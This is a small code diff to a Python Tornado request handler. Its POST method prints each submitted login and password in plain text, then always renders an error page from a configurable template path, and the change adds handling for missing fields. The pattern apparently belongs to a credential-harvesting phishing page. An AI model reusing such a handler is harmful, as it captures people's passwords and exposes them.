@@ -22,8 +22,11 @@ class MainHandler(tornado.web.RequestHandler):
 
     def post(self):
         # @TODO work with ids
-        print("login > " + self.get_argument("login"))
-        print("password > " + self.get_argument("password"))
+        try:
+            print("login > " + self.get_argument("login"))
+            print("password > " + self.get_argument("password"))
+        except tornado.web.MissingArgumentError:
+            print("\n")
         # @TODO reload the same page or an error one or something else ...
         self.render("pages/" + pagePath + "error.html")
 
